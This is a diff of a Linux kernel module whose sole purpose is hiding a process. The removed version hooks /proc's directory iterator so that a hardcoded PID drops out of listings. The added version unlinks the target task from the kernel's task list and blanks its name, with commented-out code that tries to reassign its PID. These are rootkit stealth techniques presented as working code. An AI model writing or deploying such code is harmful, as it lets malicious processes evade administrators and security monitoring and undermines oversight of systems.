@@ -3,136 +3,96 @@
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include <net/sock.h>
+#include <linux/proc_fs.h>
+#include <linux/pid_namespace.h>
+#include <linux/ptrace.h>
+#include <linux/pid.h>
+// #include <linux/pidfs.h>
+
+#define HIDEPID 7616
 
 
-#define HIDEPID 21178
+extern struct pid* alloc_pid(struct pid_namespace *, pid_t*, size_t);
 
-typedef int (*readdir_t)(struct file *, struct dir_context *);
-
-
-int hide_pid(readdir_t *orig_readdir, readdir_t new_readdir);
-int my_proc_readdir(struct file *fp, struct dir_context* dir_cont);
-bool my_proc_filldir (
-    struct dir_context* some,  const char *name, int nlen, 
-    loff_t off, u64 ino, unsigned x);
-int restore (readdir_t orig_readdir);
-int num_from_str(const char *str);
+int hide_pid(void);
 
 
-readdir_t orig_proc_readdir=NULL;
-filldir_t proc_filldir = NULL;
 
 
 int init_module(void)
 {
-    printk(KERN_INFO "Start work\n");
-    hide_pid(&orig_proc_readdir, my_proc_readdir);
+    hide_pid();
     return 0;
 }
 
-struct file_operations kek;
 
 
-int hide_pid(readdir_t *orig_readdir, readdir_t new_readdir)
+
+int hide_pid(void)
 {
-    struct file *filep;
 
-    /*open /proc */
-    if((filep = filp_open("/proc",O_RDONLY,0))==NULL)
-        return -1;
+#define NEWPID 65535
 
-    /*store proc's readdir*/
-    // memcpy(&kek, filep->f_op, sizeof(struct file_operations));
-    *orig_readdir = filep->f_op->iterate_shared;
-    // kek.iterate_shared = new_readdir;
-     
-    /* set proc's readdir to new_readdir */
-    filep->f_op->iterate_shared = new_readdir;
-    // filep->f_op = &kek;
+    struct list_head* pos = NULL;
+    struct task_struct *task = NULL, *elected_task = NULL, *task_prev = NULL, *task_next = NULL;
+    struct pid* newpid = NULL;
+    char new_comm[16] = {0};
+    struct hlist_head **ppid_hash = NULL;
+    struct hlist_head *pid_hash = NULL;
+    struct hlist_head *phlist = NULL;
+    unsigned int *ppidhash_shift = NULL;
+    unsigned int pidhash_size = 0;
+    unsigned int pidhash_idx = 0;
+    struct upid* pupid = NULL;
+    struct hlist_node** toremove = NULL;
+    unsigned int toremove_cnt = 0, toremove_idx = 0;
 
-    filp_close(filep,0);
+    int target_pid = HIDEPID;
 
-    return 0;
-}
+    printk(KERN_INFO "Target PID is %d", target_pid);
+    list_for_each(pos, &current->tasks) {
 
-int my_proc_readdir(struct file *fp, struct dir_context* dir_cont)
-// int my_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
-{
-    int r=0;
-             
-    proc_filldir = dir_cont->actor;
-    dir_cont->actor = my_proc_filldir;
-    
-    /*invoke orig_proc_readdir with my_proc_filldir*/
-    r=orig_proc_readdir(fp, dir_cont);
-            
-    return r;
-}
-
-
-bool my_proc_filldir (
-    struct dir_context* dir_cont,  const char *name, int nlen, 
-    loff_t off, u64 ino, unsigned x)
-{
-    printk(KERN_INFO "Hide PID\n");
-    /*If name is equal to our pid, then we return 0. This way,
-    our pid isn't visible*/
-    if(num_from_str(name) == HIDEPID)
-    {
-        printk(KERN_INFO "Hide PID\n");
-        return 0;
+        task = list_entry(pos, struct task_struct, tasks); 
+        if(task->pid == target_pid) {
+            elected_task = task;
+        }
     }
 
-    /*Otherwise, call original filldir*/
-    return proc_filldir(dir_cont, name, nlen, off, ino, x);    
-}
+    if(elected_task!=NULL) {
 
+        printk(KERN_INFO "Process id is %d", elected_task->pid);
 
-/*restore /proc's read*/
-int restore (readdir_t orig_readdir)
-{
-    struct file *filep;
-            
-    /*open /proc */
-    if ((filep = filp_open("/proc", O_RDONLY, 0)) == NULL)
-        return -1;
+        task_next = list_entry(elected_task->tasks.next, struct task_struct, tasks);
+        task_prev = list_entry(elected_task->tasks.prev, struct task_struct, tasks);
+        printk(KERN_INFO "Next process is %s", task_next->comm);
+        printk(KERN_INFO "Prev process is %s", task_prev->comm);
 
-    /*restore /proc's read*/
-    kek.iterate_shared = orig_readdir;
-    filep->f_op = &kek;
-
-    filp_close(filep, 0);
+        memcpy(elected_task->comm, new_comm, 16);
     
-    return 0;
-}
+        task_prev->tasks.next = elected_task->tasks.next;
+        task_next->tasks.prev = elected_task->tasks.prev;
 
+        elected_task->tasks.next = &(elected_task->tasks);
+        elected_task->tasks.prev = &(elected_task->tasks);
 
-int num_from_str(const char *str)
-{
-    int ret = 0, mul = 1;
-    const char *ptr;
+        
+        /* Change PID */
+        // pid_t new_pid = NEWPID;
+        // struct pid_namespace* ns = task_active_pid_ns(elected_task);
+        // newpid = alloc_pid(ns, &new_pid, sizeof(pid_t));
+        // newpid->numbers[0].nr = NEWPID;
+        // // change_pid(elected_task, PIDTYPE_PID, newpid);
+        // elected_task->pid = NEWPID;
 
-    for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++)
-            ;
-    ptr--;
-
-    while (ptr >= str) 
-    {
-        if (*ptr < '0' || *ptr > '9')
-            break;
-
-        ret += (*ptr - '0') * mul;
-        mul *= 10;
-        ptr--;   
+        
     }
 
-    return ret;
+    return 0;
 }
 
 
 void cleanup_module(void)
 {
-    restore(orig_proc_readdir);
     printk(KERN_INFO "Finish work\n");
 }
 
